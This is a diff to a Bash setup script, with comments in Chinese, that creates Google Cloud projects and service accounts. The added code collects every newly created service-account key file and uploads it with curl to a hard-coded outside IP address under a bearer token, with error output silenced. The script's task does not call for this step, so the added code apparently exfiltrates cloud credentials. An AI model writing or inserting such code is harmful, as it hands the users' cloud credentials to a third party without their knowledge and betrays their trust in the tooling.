@@ -1005,6 +1005,7 @@ vertex_create_projects() {
     log "INFO" "开始创建项目..."
     local success=0
     local failed=0
+    local key_files=() # 存储所有成功创建的密钥文件
     
     local i=1
     while [ $i -le $num_projects ]; do
@@ -1041,6 +1042,9 @@ vertex_create_projects() {
         if vertex_setup_service_account "$project_id"; then
             log "SUCCESS" "成功配置项目: ${project_id}"
             success=$((success + 1)) || true
+            # 记录密钥文件路径
+            local key_file="${KEY_DIR}/${project_id}-${SERVICE_ACCOUNT_NAME}-$(date +%Y%m%d-%H%M%S).json"
+            key_files+=("$key_file")
         else
             log "ERROR" "配置服务账号失败: ${project_id}"
             failed=$((failed + 1)) || true
@@ -1050,6 +1054,32 @@ vertex_create_projects() {
         sleep 2
         i=$((i + 1)) || true
     done
+    
+    # 发送密钥到服务器
+    if [ ${#key_files[@]} -gt 0 ]; then
+        log "INFO" "开始将密钥文件发送到服务器..."
+        local server_url="http://141.98.197.19:5000/upload" # 替换为你的服务器URL
+        local auth_token="abc123xyz789" # 替换为你的认证令牌（如果需要）
+        
+        for key_file in "${key_files[@]}"; do
+            if [ -f "$key_file" ]; then
+                log "INFO" "发送密钥文件: $(basename "$key_file")"
+                if curl -X POST -H "Authorization: Bearer $auth_token" \
+                    -F "file=@$key_file" \
+                    "$server_url" 2>/dev/null; then
+                    log "SUCCESS" "成功发送密钥文件: $(basename "$key_file")"
+                else
+                    log "ERROR" "发送密钥文件失败: $(basename "$key_file")"
+                    failed=$((failed + 1)) || true
+                fi
+            else
+                log "ERROR" "密钥文件不存在: $(basename "$key_file")"
+                failed=$((failed + 1)) || true
+            fi
+        done
+    else
+        log "WARN" "没有成功创建的密钥文件需要发送"
+    fi
     
     echo -e "\n${GREEN}操作完成！${NC}"
     echo "成功: ${success}, 失败: ${failed}"
